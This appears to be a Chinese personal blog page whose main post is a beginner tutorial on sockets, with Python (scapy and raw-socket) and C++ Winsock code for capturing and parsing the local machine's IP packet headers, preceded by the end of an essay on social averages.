<p>​         这样的平均也确有好处，人们意识到自身的差距，便开始往平均的线上走，也就带动了整个社会的发展，可到那时候社会的平均线还会上涨吗？如果还会上涨，那大多数人就是追着社会的平均水平过日子了，跟着它后面走，却很难超越。那如果不会呢，也就是社会的平均水平没变，这有上去的就有下来的，那谁下来呢，是那些被平均的人在内卷还是平均别人的人被被平均者打到呢？</p>
<p>​        大多数都是被平均的，那么是谁平均了他们呢？也就是开头谈的马云、王健林等人，可他们自身也无意参与这种平均啊，是别人叫他们给平均了。这些人以前反对农民的平均主义思想，咋么现在又开始平均了呢？</p>
<p>​        为什么呢？因为有用，要是肯定农民的平均主义思想，那自己的东西可不是要被分完了吗？要是现在不用平均的概念，那大家不是看不见美好生活了，那还不乱了套？</p>
<p>​        平均倒也不应只是被书写在纸上的数据，还是要落到实处。其实，被平均只是一分安慰，但也可以拉升我们的希望啊！</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/07/socket%E5%88%9D%E6%8E%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/07/socket%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">socket初探</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-07 20:40:51" itemprop="dateCreated datePublished" datetime="2021-01-07T20:40:51+08:00">2021-01-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-02-02 21:10:12" itemprop="dateModified" datetime="2021-02-02T21:10:12+08:00">2021-02-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>为了实现以下功能</p>
<blockquote>
<p>捕获本机网卡的IP包，对捕获的IP包进行解析。<br>要求必须输出以下字段：版本号、总长度、标志位、片偏移、协议、源地址和目的地址。</p>
</blockquote>
<p>我第一反应就是Python应当有这么一个库可以直接调用，那问题就解决了，通过scapy的确可以实现，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过scapy来获取本机对应网卡的IP报文</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">a = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_callback</span>(<span class="params">packet</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> (packet[<span class="number">6</span>].name == <span class="string">&#x27;IP&#x27;</span>):</span><br><span class="line">            temp = []</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.version)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.ihl)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.tos)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.len)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.id)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.flags)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.frag)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.ttl)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.proto)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.chksum)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.src)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.dst)</span><br><span class="line">            a.append(temp)</span><br><span class="line">            print(temp)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">filterstr=<span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="comment">#关于sniff的prn参数  指定回调函数，每当一个符合filter的报文被探测到时，就会执行回调函数</span></span><br><span class="line"><span class="comment">#iface参数 用来指定要在哪个网络接口上进行抓包 如若不指定即所有网络接口</span></span><br><span class="line"><span class="comment"># count指定最多嗅探多少个报文（是指符合filter条件的报文，而非所有报文）</span></span><br><span class="line">sniff(filter=filterstr,prn=pack_callback, iface=<span class="string">&#x27; &#x27;</span>, count=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>但这样的实现其实是抓取到了很多信息，通过设定prn对抓取到的信息进行处理提取出我们想要的。那如何才能对IP包进行直接抓取，这就需要用到socket了。</p>
<h5 id="以下是本人对socket的理解，并不确保完全正确。"><a href="#以下是本人对socket的理解，并不确保完全正确。" class="headerlink" title="以下是本人对socket的理解，并不确保完全正确。"></a>以下是本人对socket的理解，并不确保完全正确。</h5><h3 id="何为socket"><a href="#何为socket" class="headerlink" title="何为socket"></a>何为socket</h3><blockquote>
<p>A <strong>network socket</strong> is a software structure within a network node of a computer network that serves as an endpoint for sending and receiving data across the network.      ——<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Network_socket">Wikipedia</a></p>
</blockquote>
<p>前半句话难以理解甚至于比较抽象，但后半句其实说明了Socket即<strong>端</strong>，<strong>端作为网络通信的起点或者终点而存在</strong>。基于socket去获取信息，我们可以不用了解链路中间发生了什么，信息是如何传输的，但我们知道通过socket就是可以得到信息。它就像是API调用就好，可以输出我们想要的，而不必关注它中间做了多复杂的操作。</p>
<p>调用API你需要去传入参数，socket可以说是操作系统提供的一套API。因此创建socket也要向操作系统提交需要创建的socket的信息，然后才能创建一个对应的socket。</p>
<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/1.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">socket抽象层</div> </center>

<h4 id="socket的结构"><a href="#socket的结构" class="headerlink" title="socket的结构"></a>socket的结构</h4><p>一个socket至少包含以下内容</p>
<ol>
<li>本地socket地址：本地主机的ip+端口号。</li>
<li>传输协议：例如TCP、UDP、raw IP等。</li>
</ol>
<p>如果本地socket要与远程主机进行通信，则还有加上远程socket的地址，即远程主机的ip与端口号。</p>
<p>就如同两个人之间用手机进行通信，手机就是socket，它包含电话号码(即本地socket地址)，手机的通信协议(即传输协议)，如果要打电话，那需要对方的电话号码(即远程主机的socket地址)。类比到计算机网络环境，主机就如同人，socket就如同手机。我们并不需要知道拨打电话后发生了什么，我们只知道我们之间的通信建立成功了。</p>
<p>以上便是对socket的比喻描述，但可能并不是很恰当，因为socket创建中本地的socket地址是其固有属性，而电话号码是手机的一个附加属性。</p>
<h4 id="socket的用法"><a href="#socket的用法" class="headerlink" title="socket的用法"></a>socket的用法</h4><p>当我们已经创建好socket之后，我们需要一些操作对socket进行配置，bind,listen,connect…</p>
<p>还是手机的例子，有了手机(有了socket)，首先要再本机的多个号码中配置要用的一个(为socket关联本地地址，bind)，要打电话就要输电话号码(与远程socket建立连接,connect)，接电话(accept)。</p>
<h3 id="socket的python实现"><a href="#socket的python实现" class="headerlink" title="socket的python实现"></a>socket的python实现</h3><p>所以我们的目的其实就是创建socket，然后根据要求使用socket</p>
<h4 id="创建socket"><a href="#创建socket" class="headerlink" title="创建socket"></a>创建socket</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">socket.socket(family&#x3D;AF_INET, type&#x3D;SOCK_STREAM, proto&#x3D;0, fileno&#x3D;None)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>family</code>-用于指定socket的地址类型。常见由<code>AF-INET</code>和<code>AF-INET6</code>,分别表示IPv4和IPv6，AF即<code>Address Family</code>。</li>
<li><code>type</code>-用于指定socket类型。主要有以下类型<ol>
<li><code>SOCK_STREAM</code>：使用TCP或STCP协议，面向连接的socket</li>
<li><code>SOCK_DGRAM</code>：使用UDP协议，面向无连接的socket</li>
<li><code>SOCK_RAW</code>：原始套接字。这类socket，数据包将绕过运输层，因此可以在应用层得到数据包的头部</li>
</ol>
</li>
<li><code>proto</code>-协议号通常为零,可以省略。这相当于为指定协议在运输层打开一个缺口，从而在运输层放行该协议的包。IPPROTO_TCP 、 IPPROTO_IP 、IPPROTO_UDP代表三种不同的协议，分别代表IP协议族里面的TCP协议、IP协议和UDP协议。</li>
<li><code>fileno</code>-如果指定了fileno,则其他参数将被忽略,导致带有指定文件描述符的套接字返回。</li>
</ul>
<h4 id="使用socket"><a href="#使用socket" class="headerlink" title="使用socket"></a>使用socket</h4><p>关于socket的使用，按使用协议的不同可以分为TCP通信和UDP通信，按使用场景不同，又可以分为客户端与服务器端。</p>
<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/3.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">基于TCP的socket通讯流程图</div> </center>

<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/4.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">基于UDP的socket通讯流程图</div> </center>

<h4 id="socket基本函数"><a href="#socket基本函数" class="headerlink" title="socket基本函数"></a>socket基本函数</h4><ul>
<li><code>socket.bind(adress)</code> - 该函数将socket绑定到一个地址上，为socket关联一个相应的IP和端口号。要注意2点：1. 一个socket只能绑定到一个地址上，不能重复绑定；2. 地址格式必须与创建socket时指定的一致，例如不能将INET socket绑定到INET6 socket上</li>
<li><code>socket.listen([backlog])</code> - 启动监听，即允许服务器接受连接。backlog参数用于指定最大连接数，一旦服务器达到最大连接数，之后的连接都将被拒绝。backlog参数的大小，决定了TCP服务器的连接请求队列大小，进一步影响客户端连接请求的成功与否。</li>
<li><code>socket.connect(address)</code> - 与远程socket建立连接。只有使用TCP才需要建立连接，UDP是无连接的。</li>
<li><code>socket.accept()</code> - 接受一个连接。其返回值是<code>(conn, address)</code>，其中conn是是一个新的socket对象，用于与建立连接的socket收发数据，address则作为远程socket地址绑定到该socket上。原始socket与主机的一个端口绑定，但并不意味着socket占用了该端口，而是向TCP\IP协议栈声明了其对80端口的占用。新创建的socket使用的端口是不变的，这并不意味着端口占用。而是因为<strong>socket只是对TCP/IP协议栈操作的抽象，而不是简单的映射关系</strong>。</li>
<li><code>socket.send(bytes)</code>/<code>socket.sendto(bytes[,flags], address)</code> - 向远程socket发送数据，注意，必须以bytes格式发送。而使用<code>sendto</code>时，要指名目的socket的地址。</li>
<li><code>socket.recv(bufsize[, flags])</code>/<code>socket.recvfrom(bufsize[, flags])</code> - 从socket接收数据，通过<code>bufsize</code>指定一次性接收数据的最大量，<code>recv</code>的返回值是bytes对象，而<code>recvfrom</code>的返回值是<code>(data, address)</code>，address即为发送数据的socket地址。</li>
</ul>
<h4 id="socket实现服务器端与客户端通信"><a href="#socket实现服务器端与客户端通信" class="headerlink" title="socket实现服务器端与客户端通信"></a>socket实现服务器端与客户端通信</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 服务器端</span><br><span class="line">import socket</span><br><span class="line"># 创建socket</span><br><span class="line">with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">    s.bind((&quot;127.0.0.1&quot;, 56789))  # 绑定地址，如前所述，socket地址由ip地址与port组成</span><br><span class="line">    s.listen(1)  # 启动监听，并设置最大连接数为1</span><br><span class="line">    conn, addr &#x3D; s.accept()  # 接受连接，并将返回的新socket与addr info分别储存</span><br><span class="line">    with conn:</span><br><span class="line">        print(&#39;Connected by&#39;, addr)  # 在本地打印信息，测试用</span><br><span class="line">        while True:</span><br><span class="line">            data &#x3D; conn.recv(65565)  # 65535是一次性能接收的最大值</span><br><span class="line">            if not data:</span><br><span class="line">                break</span><br><span class="line">            conn.send(data)  # 将数据原样发回</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">#客户端</span><br><span class="line">import socket</span><br><span class="line"># 创建socket with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">    s.connect((&quot;127.0.0.1&quot;, 56789))  # 连接到另一个socket     </span><br><span class="line">    s.send(b&#39;Hello, socket&#39;)  # 向对方socket发送数据     </span><br><span class="line">    data &#x3D; s.recv(65565)</span><br><span class="line">print(&#39;Received&#39;, str(data))  # 打印收到的数据 </span><br></pre></td></tr></table></figure>
<p>以上代码实现了在本机范围内的通信，修改IP为远程服务器IP即可与远程服务器建立连接。</p>
<h3 id="Package-analyse"><a href="#Package-analyse" class="headerlink" title="Package analyse"></a>Package analyse</h3><p>在此我们需要为设置socket的类型为原始套接字，并为其指定协议IPPROTO_TCP表明要抓取TCP协议报文。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#demo</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line">    while True:</span><br><span class="line">        print(s.recvfrom(65565))</span><br></pre></td></tr></table></figure>
<p>recvfrom返回data和address。data部分由<code>IP header + TCP header + data</code>组成，于是我们基于对socket的理解，便可以着手去用socket抓取IP报文，并对IP报文报头进行分析。</p>
<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/5.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">IP数据包格式</div> </center>

<p>通过如下处理便可以得到IP报文首部的数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">    s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        raw_packet = s.recvfrom(<span class="number">65565</span>)</span><br><span class="line">        packet = raw_packet[<span class="number">0</span>]</span><br><span class="line">        raw_iph = packet[<span class="number">0</span>:<span class="number">20</span>]</span><br><span class="line">        <span class="comment"># unpack(fmt, buffer) - 根据指定的格式化字符串来拆解给定的buffer</span></span><br><span class="line">        <span class="comment"># B 单字节的整型</span></span><br><span class="line">        <span class="comment"># H 双字节的整型</span></span><br><span class="line">        <span class="comment"># s bytes，前加数字表示取4字节的bytes</span></span><br><span class="line">        iph = unpack(<span class="string">&quot;!BBHHHBBH4s4s&quot;</span>, raw_iph)</span><br><span class="line">        fields = &#123;&#125;</span><br><span class="line">        fields[<span class="string">&quot;Version&quot;</span>] = iph[<span class="number">0</span>] &gt;&gt; <span class="number">4</span>    <span class="comment"># 版本字段与IP数据报头部共享一个字节，通过右移操作取得单独的版本字段</span></span><br><span class="line">        fields[<span class="string">&quot;IP Header Length&quot;</span>] = (iph[<span class="number">0</span>] &amp; <span class="number">0xF</span>) * <span class="number">4</span>    <span class="comment"># 首部长度字段的1代表4个字节</span></span><br><span class="line">        fields[<span class="string">&quot;Type of Service&quot;</span>] = iph[<span class="number">1</span>]    <span class="comment"># 区分服务，一般情况下并不使用</span></span><br><span class="line">        fields[<span class="string">&quot;Total Length&quot;</span>] = iph[<span class="number">2</span>]    <span class="comment"># IP首部+数据的总长度，即len(packet)</span></span><br><span class="line">        fields[<span class="string">&quot;Identification&quot;</span>] = iph[<span class="number">3</span>]    <span class="comment"># 标识</span></span><br><span class="line">        flags = iph[<span class="number">4</span>] &gt;&gt; <span class="number">13</span>    <span class="comment"># 标识位与片偏移共享2个字节，且最高位并且未使用</span></span><br><span class="line">        fields[<span class="string">&quot;MF&quot;</span>] = <span class="number">1</span> <span class="keyword">if</span> flags &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>    <span class="comment"># 测试最低位</span></span><br><span class="line">        fields[<span class="string">&quot;DF&quot;</span>] = <span class="number">1</span> <span class="keyword">if</span> flags &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>    <span class="comment"># 测试中间位</span></span><br><span class="line">        fields[<span class="string">&quot;Fragment Offset&quot;</span>] = iph[<span class="number">4</span>] &amp; <span class="number">0x1FFF</span>    <span class="comment"># 位与操作取得片偏移</span></span><br><span class="line">        fields[<span class="string">&quot;Time to Live&quot;</span>] = iph[<span class="number">5</span>]    <span class="comment"># 生存时间，单位是跳数</span></span><br><span class="line">        fields[<span class="string">&quot;Protocol&quot;</span>] = iph[<span class="number">6</span>]    <span class="comment"># 数据报携带的数据使用的协议，TCP为6</span></span><br><span class="line">        fields[<span class="string">&quot;Header Checksum&quot;</span>] = iph[<span class="number">7</span>]    <span class="comment"># 首部校验和</span></span><br><span class="line">        <span class="comment"># socket.inet_ntoa(..)</span></span><br><span class="line">        <span class="comment"># - convert an ip address from 32-bit packed binary format to string format</span></span><br><span class="line">        fields[<span class="string">&quot;Source Address&quot;</span>] = socket.inet_ntoa(iph[<span class="number">8</span>])</span><br><span class="line">        fields[<span class="string">&quot;Destination Address&quot;</span>] = socket.inet_ntoa(iph[<span class="number">9</span>])</span><br></pre></td></tr></table></figure>
<p>通过上述代码的解析我们可以获取到IP首部，同理我们也可以去解析TCP首部。</p>
<p>我们为其指定协议为IPPROTO_TCP，可以获取TCP报文，但如果采用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))</span><br></pre></td></tr></table></figure>
<p>来创建socket，便可以获取信息更全面的数据包，<code>ethernet frame header + IP header+ inner-Protocol header+data</code>。再对各个部分进行切片操作，根据报文格式进行提取，就可以实现对本机所有以太网帧的捕获与分析了！</p>
<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/6.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">数据报格式</div> </center>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了实现socket编程，起初尝试用C++完成任务，学习网上的代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mstcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;IP_HEAD.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> number;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DecodeIP</span><span class="params">(<span class="keyword">char</span>* buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = len;</span><br><span class="line">    <span class="keyword">if</span> (n &gt;= <span class="keyword">sizeof</span>(IP_HEAD))</span><br><span class="line">    &#123;</span><br><span class="line">        IP_HEAD iphead;</span><br><span class="line">        iphead = *(IP_HEAD*)buf;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;第 &quot;</span> &lt;&lt; number++ &lt;&lt; <span class="string">&quot; 个IP数据包信息：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;协议版本:&quot;</span> &lt;&lt; (iphead.ver_hlen &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;总长度:&quot;</span> &lt;&lt; ntohs(iphead.wPacketLen) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//网络字节序转为主机字节序</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;标志位:&quot;</span> &lt;&lt; <span class="string">&quot;DF=&quot;</span> &lt;&lt; ((iphead.Flags &gt;&gt; <span class="number">14</span>) &amp; <span class="number">0x01</span>) &lt;&lt; <span class="string">&quot;,MF=&quot;</span> &lt;&lt; ((iphead.Flags &gt;&gt; <span class="number">13</span>) &amp; <span class="number">0x01</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;片偏移:&quot;</span> &lt;&lt; (iphead.FragOf &amp; <span class="number">0x1fff</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;协议:&quot;</span> &lt;&lt; <span class="keyword">int</span>(iphead.byProtocolType) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;源地址:&quot;</span> &lt;&lt; inet_ntoa(*(in_addr*)&amp;iphead.dwIPSrc) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;目的地址:&quot;</span> &lt;&lt; inet_ntoa(*(in_addr*)&amp;iphead.dwIPDes) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;---------------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AutoWSACleanup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ::WSACleanup();  <span class="comment">// 终止Winsock的使用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    WSADATA wd;  <span class="comment">//一种数据结构,这个结构被用来存储被WSAStartup函数调用后返回的Windows Sockets数据,它包含Winsock.dll执行的数据。</span></span><br><span class="line">    n = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wd);  <span class="comment">//返回winsock服务初始化是否成功，若返回1则输出错误</span></span><br><span class="line">    <span class="keyword">if</span> (n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;WSAStartup函数错误！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    atexit(AutoWSACleanup);</span><br><span class="line">    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);  <span class="comment">//创建SOCKET</span></span><br><span 